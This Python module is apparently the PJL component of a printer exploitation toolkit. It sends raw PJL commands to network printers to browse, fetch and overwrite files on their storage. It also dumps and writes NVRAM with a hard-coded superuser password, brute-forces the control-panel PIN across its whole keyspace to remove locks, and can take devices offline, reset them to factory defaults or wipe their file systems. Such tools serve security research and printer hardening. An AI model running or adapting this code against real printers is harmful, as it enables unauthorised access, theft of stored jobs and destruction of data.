# -*- coding: utf-8 -*-

# python standard library
import re, os, random, posixpath

# local pret classes
from printer import printer
from codebook import codebook
from helper import log, output, file, item, chunks, const as c

class pjl(printer):
  # --------------------------------------------------------------------
  # send PJL command to printer, optionally receive response
  def cmd(self, str_send, wait=True, crop=True, binary=False):
    str_recv = "" # response buffer
    str_stat = "" # status buffer
    token = c.DELIMITER + str(random.randrange(2**16)) # unique delimiter
    footer = '@PJL ECHO ' + token + c.EOL + c.EOL if wait else ''
    status = '@PJL INFO STATUS' + c.EOL if self.status and wait else ''
    # send command to printer device
    try:
      cmd_send = str_send + c.EOL + status + footer + c.UEL
      # write to logfile
      log().write(self.logfile, str_send + os.linesep)
      # sent to printer
      self.conn.send(cmd_send)
      # for commands that expect a response
      if wait:
        # use random token as delimiter PJL responses
        str_recv = self.conn.recv_until("(@PJL ECHO\s+)?" + token + ".*$", wait, True, binary)
        if self.status:
          # get status messages and remove them from received buffer
          str_stat = item(re.findall("@PJL INFO STATUS.*", str_recv, re.DOTALL))
          str_recv = re.compile('@PJL INFO STATUS.*', re.DOTALL).sub('', str_recv)
        if crop:
          # crop very first PJL line which is echoed by most interpreters
          str_recv = re.sub(r'(^(\x00+)?@PJL.*(' + c.EOL + '|$))', '', str_recv)
      return self.pjl_err(str_recv, str_stat)

    # handle CTRL+C and exceptions
    except (KeyboardInterrupt, Exception) as e:
      if not self.fuzz or not str(e): self.reconnect(str(e))
      return ""

  # handle error messages from PJL interpreter
  def pjl_err(self, str_recv, str_stat):
    # show file error messages
    self.fileerror(str_recv)
    # show PJL status messages
    self.showstatus(str_stat)
    # but return buffer anyway
    return str_recv

  # disable unsolicited/conflicting status messages
  def on_connect(self, mode):
    if mode == 'init': self.cmd('@PJL USTATUSOFF', False)

  # ------------------------[ status ]----------------------------------
  def do_status(self, arg):
    "Enable status messages."
    self.status = not self.status
    print("Status messages enabled" if self.status else "Status messages disabled")

  # parse PJL status message
  def showstatus(self, str_stat):
    codes = {}; messages = {}
    # get status codes
    for (num, code) in re.findall('CODE(\d+)?\s*=\s*(\d+)', str_stat):
      codes[num] = code
    # get status messages
    for (num, mstr) in re.findall('DISPLAY(\d+)?\s*=\s*"(.*)"', str_stat):
      messages[num] = mstr
    # show codes and messages
    for num, code in codes.items():
      message = messages[num] if num in messages else "UNKNOWN STATUS"
      # workaround for hp printers with wrong range
      if code.startswith("32"):
        code = str(int(code) - 2000)
      # show status from display and codebook
      error = item(codebook().get_errors(code), 'Unknown status')
      output().errmsg("CODE " + code + ": " + message, error)

  # parse PJL file errors
  def fileerror(self, str_recv):
    self.error = None
    for code in re.findall("FILEERROR\s*=\s*(\d+)", str_recv):
      # file errors are 300xx codes
      code = "3" + code.zfill(4)
      for error in codebook().get_errors(code):
        self.chitchat("PJL Error: " + error)
        self.error = code

  # --------------------------------------------------------------------
  # check if remote volume exists
  def vol_exists(self, vol):
    str_recv = self.cmd('@PJL INFO FILESYS')
    for line in str_recv.splitlines():
      if line.lstrip() and line.lstrip()[0].isdigit() and vol[0] == line.lstrip()[0]:
        return True

  # check if remote directory exists
  def dir_exists(self, path):
    str_recv = self.cmd('@PJL FSQUERY NAME="' + path + '"', True, False)
    if re.search("TYPE=DIR", str_recv):
      return True

  # check if remote file exists
  def file_exists(self, path):
    str_recv = self.cmd('@PJL FSQUERY NAME="' + path + '"', True, False)
    size = re.findall("TYPE\s*=\s*FILE\s+SIZE\s*=\s*(\d*)", str_recv)
    # return file size
    return int(item(size, c.NONEXISTENT))

  #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
  # auto-complete dirlist for remote fs
  options_rfiles = {}
  def complete_rfiles(self, text, line, begidx, endidx, path=''):
    # get path from line
    if c.SEP in line:
      path = posixpath.dirname(re.split("\s+", line, 1)[-1:][0])
    # get dirlist, set new remote path
    newpath = self.cwd + c.SEP + path
    if not self.options_rfiles or newpath != self.oldpath_rfiles:
      self.options_rfiles = self.dirlist(path)
      self.oldpath_rfiles = self.cwd + c.SEP + path
    # options_rfiles contains basenames
    text = self.basename(text)
    return [cat for cat in self.options_rfiles if cat.startswith(text)]

  # define alias
  complete_delete = complete_rfiles # files or directories
  complete_rm     = complete_rfiles # files or directories
  complete_get    = complete_rfiles # files or directories
  complete_cat    = complete_rfiles # files or directories
  complete_edit   = complete_rfiles # files or directories
  complete_vim    = complete_rfiles # files or directories
  complete_touch  = complete_rfiles # files or directories

  #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
  # auto-complete dirlist for remote fs (directories only)
  options_rdirs = {}
  def complete_rdirs(self, text, line, begidx, endidx, path=''):
    # get path from line
    if c.SEP in line:
      path = posixpath.dirname(re.split("\s+", line, 1)[-1:][0])
    # get dirlist, set new remote path
    newpath = self.cwd + c.SEP + path
    if not self.options_rdirs or newpath != self.oldpath_rdirs:
      self.options_rdirs = self.dirlist(path, True, False, True)
      self.oldpath_rdirs = newpath
    # options_rdirs contains basenames
    text = self.basename(text)
    return [cat for cat in self.options_rdirs if cat.startswith(text)]

  # define alias
  complete_ls     = complete_rdirs # directories only
  complete_cd     = complete_rdirs # directories only
  complete_rmdir  = complete_rdirs # directories only
  complete_find   = complete_rdirs # directories only
  complete_mirror = complete_rdirs # directories only

  #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
  # get list of files and directories on remote device
  def dirlist(self, path, sep=True, hidden=False, dirsonly=False, r=True):
    # get remote path if not in recursive mode
    if r: path = self.rpath(path)
    # receive list of files on remote device
    str_recv = self.cmd('@PJL FSDIRLIST NAME="' + path + '" ENTRY=1 COUNT=65535')
    list = {}
    for item in str_recv.splitlines():
      # get directories
      dirname = re.findall("^(.*)\s+TYPE\s*=\s*DIR$", item)
      if dirname and (dirname[0] not in (".", "..") or hidden):
        list[dirname[0] + (c.SEP if sep else '')] = None
      # get files
      filename = re.findall("^(.*)\s+TYPE\s*=\s*FILE", item)
      filesize = re.findall("FILE\s+SIZE\s*=\s*(\d*)", item)
      if filename and filesize and not dirsonly:
        list[filename[0]] = filesize[0]
    return list

  # ------------------------[ ls <path> ]-------------------------------
  def do_ls(self, arg):
    "List contents of remote directory:  ls <path>"
    list = self.dirlist(arg, False, True)
    # remove '.' and '..' from non-empty directories
    if set(list).difference(('.', '..')):
      for key in set(list).intersection(('.', '..')): del list[key]
    # list files with syntax highlighting
    for name, size in sorted(list.items()):
      output().pjldir(name, size)

  # ====================================================================

  # ------------------------[ mkdir <path> ]----------------------------
  def do_mkdir(self, arg):
    "Create remote directory:  mkdir <path>"
    if not arg:
      arg = raw_input("Directory: ")
    path = self.rpath(arg)
    self.cmd('@PJL FSMKDIR NAME="' + path + '"', False)

  # ------------------------[ get <file> ]------------------------------
  def get(self, path, size=None):
    if not size:
      size = self.file_exists(path)
    if size != c.NONEXISTENT:
      str_recv = self.cmd('@PJL FSUPLOAD NAME="' + path + '" OFFSET=0 SIZE=' + str(size), True, True, True)
      return (size, str_recv)
    else:
      print("File not found.")
      return c.NONEXISTENT

  # ------------------------[ put <local file> ]------------------------
  def put(self, path, data):
      lsize = len(data)
      self.cmd('@PJL FSDOWNLOAD FORMAT:BINARY SIZE=' + str(lsize) +
               ' NAME="' + path + '"' + c.EOL + data, False)

  # ------------------------[ append <file> <string> ]------------------
  def append(self, path, data):
      lsize = len(data)
      self.cmd('@PJL FSAPPEND FORMAT:BINARY SIZE=' + str(lsize) +
               ' NAME="' + path + '"' + c.EOL + data, False)

  # ------------------------[ delete <file> ]---------------------------
  def delete(self, arg):
    path = self.rpath(arg)
    self.cmd('@PJL FSDELETE NAME="' + path + '"', False)

  # ------------------------[ find <path> ]-----------------------------
  def do_find(self, arg):
    "Recursively list contents of directory:  find <path>"
    self.fswalk(arg, 'find')

  # ------------------------[ mirror <local path> ]---------------------
  def do_mirror(self, arg):
    "Mirror remote filesystem to local directory:  mirror <remote path>"
    print("Creating mirror of " + c.SEP + self.vpath(arg))
    self.fswalk(arg, 'mirror')

  # perform recursive function on file system
  def fswalk(self, arg, mode, recursive=False):
    # add traversal and cwd in first run
    if not recursive: arg = self.vpath(arg)
    # add volume information to pathname
    path = self.vol + self.normpath(arg)
    list = self.dirlist(path, True, False, False, False)
    # for files in current directory
    for name, size in sorted(list.items()):
      name = self.normpath(arg) + self.get_sep(arg) + name
      name = name.lstrip(c.SEP) # crop leading slashes
      # execute function for current file
      if mode == 'find': output().raw(c.SEP + name)
      if mode == 'mirror': self.mirror(name, size)
      # recursion on directory
      if not size: self.fswalk(name, mode, True)

  # ====================================================================

  # ------------------------[ display <message> ]-----------------------
  def do_display(self, arg):
    "Set printer's display message:  display <message>"
    if not arg:
      arg = raw_input("Message: ")
    arg = arg.strip('"') # remove quotes
    self.cmd('@PJL RDYMSG DISPLAY="' + arg + '"', False)

  # ------------------------[ offline <message> ]-----------------------
  def do_offline(self, arg):
    "Take printer offline and display message:  offline <message>"
    if not arg:
      arg = raw_input("Offline display message: ")
    arg = arg.strip('"') # remove quotes
    output().warning("Warning: Taking the printer offline will prevent yourself and others")
    output().warning("from printing or re-connecting to the device. Press CTRL+C to abort.")
    if output().countdown("Taking printer offline in...", 10, self):
      self.cmd('@PJL OPMSG DISPLAY="' + arg + '"', False)

  # ------------------------[ restart ]---------------------------------
  def do_restart(self, arg):
    "Restart printer."
    self.cmd('@PJL DMCMD ASCIIHEX="040006020501010301040104"', False)

  # ------------------------[ reset ]-----------------------------------
  def do_reset(self, arg):
    "Reset to factory defaults."
    if output().countdown("Restoring factory defaults in...", 10, self):
      self.cmd('@PJL DMCMD ASCIIHEX="040006020501010301040106"', False)
      # '@PJL SET SERVICEMODE=HPBOISEID' + c.EOL
      # '@PJL CLEARNVRAM'                + c.EOL
      # '@PJL NVRAMINIT'                 + c.EOL
      # '@PJL SET SERVICEMODE=EXIT', False)

  # ------------------------[ fsinit ]----------------------------------
  def do_fsinit(self, arg):
    "Initialize printer's mass storage file system."
    output().warning("Warning: Initializing the printer's file system will whipe-out all")
    output().warning("user data (e.g. stored jobs) on the volume. Press CTRL+C to abort.")
    if output().countdown("Initializing volume " + self.vol[:2] + " in...", 10, self):
      self.cmd('@PJL FSINIT VOLUME="' + self.vol[0] + '"', False)

  # ------------------------[ disbale ]---------------------------------
  def do_disable(self, arg):
    "Disable printing functionality."
    self.disable = not self.disable
    str_disable = "OFF" if self.disable else "ON"
    self.chitchat("Printing " + str_disable)
    self.do_set('JOBMEDIA=' + str_disable)

  # ------------------------[ hold ]------------------------------------
  def do_hold(self, arg):
    "Enable job retention."
    self.do_set('HOLD=ON')
    output().raw("Job retention: ", "")
    if self.do_info('variables', 'HOLD') == c.NONEXISTENT:
      output().raw("not available")

  # nvram operations (brother-specific)
  def do_nvram(self, arg):
    # dump nvram
    if arg == 'dump':
      # interesting stuff can usually be found in those address spaces
      memspace = range(0, 2048) + range(53248, 59648) # (32768, 36864), (53248, 118784)
      commands = ['@PJL RNVRAM ADDRESS=' + str(n) for n in memspace]
      steps = 2**8 # number of bytes to dump at once (feedback-performance trade-off)
      outfile = self.basename(self.target) + '.nvram' # local copy of printer's nvram
      self.chitchat("Writing copy to " + outfile)
      file().write(outfile, '') # first write empty file
      # read nvram and write to local file
      for chunk in (list(chunks(commands, steps))):
        str_recv = self.cmd(c.EOL.join(chunk))
        # break on unsupported printers
        if not str_recv:
          os.remove(outfile)
          return
        for data in re.findall('DATA\s*=\s*(\d+)', str_recv):
          char = chr(int(data))
          # append char to file
          file().append(outfile, char)
          # print char to screen
          output().raw(char if int(data) in range(32, 127) else '.', "")
      print
    # read nvram
    elif arg.startswith('read'):
      arg = re.split("\s+", arg, 1)
      if len(arg) > 1:
        arg, addr = arg
        output().info(self.cmd('@PJL RNVRAM ADDRESS=' + addr))
      else: self.help_nvram()
    # write nvram
    elif arg.startswith('write'):
      arg = re.split("\s+", arg, 2)
      if len(arg) > 2:
        arg, addr, data = arg
        self.cmd('@PJL SUPERUSER PASSWORD=0' + c.EOL
               + '@PJL WNVRAM ADDRESS=' + addr + ' DATA=' + data + c.EOL
               + '@PJL SUPERUSEROFF', False)
      else: self.help_nvram()
    else:
      self.help_nvram()

  def help_nvram(self):
    print("NVRAM operations:  nvram <operation>")
    print("  nvram dump                 - Dump NVRAM to local file.")
    print("  nvram read addr            - Read single byte from address.")
    print("  nvram write addr value     - Write single byte to address.")

  options_nvram = ('dump', 'read', 'write')
  def complete_nvram(self, text, line, begidx, endidx):
    return [cat for cat in self.options_nvram if cat.startswith(text)]

  # ====================================================================

  # ------------------------[ id ]--------------------------------------
  def do_id(self, *arg):
    "Show device information (alias for 'info id')."
    self.do_info('id')

  # ------------------------[ df ]--------------------------------------
  def do_df(self, arg):
    "Show volume information (alias for 'info filesys')."
    self.do_info('filesys')

  # ------------------------[ free ]------------------------------------
  def do_free(self, arg):
    "Show available memory (alias for 'info memory')."
    self.do_info('memory')

  # ------------------------[ env ]-------------------------------------
  def do_env(self, arg):
    "Show environment variables (alias for 'info variables')."
    self.do_info('variables', arg, True)

  # ------------------------[ serial ]----------------------------------
  def do_serial(self, *arg):
    "Show serial number (from 'info config')."
    self.do_info('config', '.*SERIAL.*')

  # ------------------------[ firmware ]--------------------------------
  def do_firmware(self, *arg):
    "Show firmware datecode/version (from 'info config')."
    self.do_info('config', '.*FIRMWARE.*')

  # ------------------------[ info <category> ]-------------------------
  def do_info(self, arg, item="", options=False):
    if arg in self.options_info:
      str_recv = self.cmd('@PJL INFO ' + arg.upper()).rstrip()
      if item:
        if options:
          match = re.findall("(" + item + "=.*(\n\t.*)*)", str_recv, re.I|re.M)
          if match: match = match[0] # HACKHACKHACK
        else: match = re.findall(item + "=(.*)", str_recv)
        if match: output().info(match[0]) # return first item only
        else: return c.NONEXISTENT
      else:
        for line in str_recv.splitlines():
          if arg == 'id': line = line.strip('"')
          if arg == 'filesys': line = line.lstrip()
          output().info(line)
    else:
      self.help_info()

  def help_info(self):
    print("Show information:  info <category>")
    print("  info config      - Provides configuration information.")
    print("  info filesys     - Returns PJL file system information.")
    print("  info id          - Provides the printer model number.")
    print("  info memory      - Identifies amount of memory available.")
    print("  info pagecount   - Returns the number of pages printed.")
    print("  info status      - Provides the current printer status.")
    print("  info ustatus     - Lists the unsolicited status variables.")
    print("  info variables   - Lists printer's environment variables.")

  # undocumented (old hp laserjet): log, tracking, prodinfo, supplies
  options_info = ('config', 'filesys', 'id', 'log', 'memory', 'pagecount',
    'prodinfo', 'status', 'supplies', 'tracking', 'ustatus', 'variables')
  def complete_info(self, text, line, begidx, endidx):
    return [cat for cat in self.options_info if cat.startswith(text)]

  # ------------------------[ printenv <variable> ]--------------------------------
  def do_printenv(self, arg):
    "Show printer environment variable:  printenv <VAR>"
    str_recv = self.cmd('@PJL INFO VARIABLES')
    variables = []
    for item in str_recv.splitlines():
      var = re.findall("^(.*)=", item)
      if var:
        variables += var
      self.options_printenv = variables
      match = re.findall("^(" + re.escape(arg) + ".*)\s?\[", item, re.I)
      if match:
        output().info(match[0])

  options_printenv = []
  def complete_printenv(self, text, line, begidx, endidx):
    if not self.options_printenv:
      str_recv = self.cmd('@PJL INFO VARIABLES')
      for item in str_recv.splitlines():
        match = re.findall("^(.*)=", item)
        if match:
          self.options_printenv += match
    return [cat for cat in self.options_printenv if cat.startswith(text)]

  # define alias
  complete_env = complete_printenv
  complete_set = complete_printenv

  # ------------------------[ set ]-------------------------------------
  def do_set(self, arg):
    "Set printer environment variable:  set <VAR=VALUE>"
    if not arg:
      arg = raw_input("Set variable (VAR=VALUE): ")
    self.cmd('@PJL SET SERVICEMODE=HPBOISEID' + c.EOL
           + '@PJL DEFAULT ' + arg            + c.EOL
           + '@PJL SET '     + arg            + c.EOL
           + '@PJL SET SERVICEMODE=EXIT', False)

  # ====================================================================

  # ------------------------[ lock <pin> ]------------------------------
  def do_lock(self, arg):
    "Lock control panel settings and disk write access."
    if not arg:
      arg = raw_input("Enter PIN (1..65535): ")
    self.cmd('@PJL DEFAULT PASSWORD=' + arg + c.EOL
           + '@PJL DEFAULT CPLOCK=ON'       + c.EOL
           + '@PJL DEFAULT DISKLOCK=ON', False)
    self.show_lock()

  def show_lock(self):
    passwd   = self.cmd('@PJL DINQUIRE PASSWORD') or "UNSUPPORTED"
    cplock   = self.cmd('@PJL DINQUIRE CPLOCK')   or "UNSUPPORTED"
    disklock = self.cmd('@PJL DINQUIRE DISKLOCK') or "UNSUPPORTED"
    if '?' in passwd:   passwd   = "UNSUPPORTED"
    if '?' in cplock:   cplock   = "UNSUPPORTED"
    if '?' in disklock: disklock = "UNSUPPORTED"
    output().info("PIN protection:  " + passwd)
    output().info("Panel lock:      " + cplock)
    output().info("Disk lock:       " + disklock)

  # ------------------------[ unlock <pin> ]----------------------------
  def do_unlock(self, arg):
    "Unlock control panel settings and disk write access."
    # first check if locking is supported by device
    str_recv = self.cmd('@PJL DINQUIRE PASSWORD')
    if not str_recv or '?' in str_recv:
      return output().errmsg("Cannot unlock", "locking not supported by device")
    # user-supplied pin vs. 'exhaustive' key search
    if not arg:
      print("No PIN given, cracking.")
      keyspace = [""] + range(1, 65536) # protection can be bypassed with
    else:                               # empty password one some devices
      try:
        keyspace = [int(arg)]
      except Exception as e:
        output().errmsg("Invalid PIN", str(e))
        return
    # for optimal performance set steps to 500-1000 and increase timeout
    steps = 500 # set to 1 to get actual PIN (instead of just unlocking)
    # unlock, bypass or crack PIN
    for chunk in (list(chunks(keyspace, steps))):
      str_send = ""
      for pin in chunk:
        # try to remove PIN protection
        str_send += '@PJL JOB PASSWORD=' + str(pin) + c.EOL \
                 +  '@PJL DEFAULT PASSWORD=0' + c.EOL
      # check if PIN protection still active
      str_send += '@PJL DINQUIRE PASSWORD'
      # visual feedback on cracking process
      if len(keyspace) > 1 and pin:
        self.chitchat("\rTrying PIN " + str(pin) + " (" + "%.2f" % (pin/655.35) + "%)", '')
      # send current chunk of PJL commands
      str_recv = self.cmd(str_send)
      # seen hardcoded strings like ENABLED, ENABLE and ENALBED (sic!) in the wild
      if str_recv.startswith("ENA"):
        if len(keyspace) == 1:
          output().errmsg("Cannot unlock", "Bad PIN")
      else:
        # disable control panel lock and disk lock
        self.cmd('@PJL DEFAULT CPLOCK=OFF' + c.EOL
               + '@PJL DEFAULT DISKLOCK=OFF', False)
        if len(keyspace) > 1 and pin:
          self.chitchat("\r")
        # exit cracking loop
        break
    self.show_lock()
